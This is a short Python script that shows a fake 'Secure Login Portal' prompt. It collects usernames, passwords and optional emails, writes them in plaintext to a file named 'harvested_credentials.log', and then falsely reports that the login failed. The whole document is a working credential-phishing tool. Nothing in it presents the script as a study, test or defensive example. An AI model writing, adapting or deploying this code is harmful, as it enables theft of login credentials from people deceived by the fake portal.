import time

def log_credentials(username, password, email=None):
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    with open("harvested_credentials.log", "a") as file:
        file.write(f"[{timestamp}] Username: {username}, Password: {password}")
        if email:
            file.write(f", Email: {email}")
        file.write("\n")

def simulate_login():
    print("="*40)
    print("     Secure Login Portal")
    print("="*40)

    username = input("Enter your username: ").strip()
    password = input("Enter your password: ").strip()

    has_email = input("Would you like to provide your email for verification? (y/n): ").strip().lower()
    email = None
    if has_email == 'y':
        email = input("Enter your email: ").strip()

    log_credentials(username, password, email)
    print("\nLogin failed. Please try again later.")

if __name__ == "__main__":
    simulate_login()
